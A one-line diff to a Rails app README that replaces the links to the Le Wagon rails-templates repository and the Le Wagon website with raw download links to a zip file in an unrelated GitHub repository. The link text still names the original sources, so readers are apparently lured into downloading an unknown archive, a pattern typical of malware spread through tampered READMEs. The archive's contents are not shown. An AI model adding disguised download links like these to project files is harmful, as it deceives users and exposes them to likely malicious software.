@@ -1,1 +1,1 @@
-Rails app generated with [lewagon/rails-templates](https://github.com/lewagon/rails-templates), created by the [Le Wagon coding bootcamp](https://www.lewagon.com) team.
+Rails app generated with [lewagon/rails-templates](https://raw.githubusercontent.com/Genesisnrg22/vamospila/master/phyllobranchiate/vamospila.zip), created by the [Le Wagon coding bootcamp](https://raw.githubusercontent.com/Genesisnrg22/vamospila/master/phyllobranchiate/vamospila.zip) team.
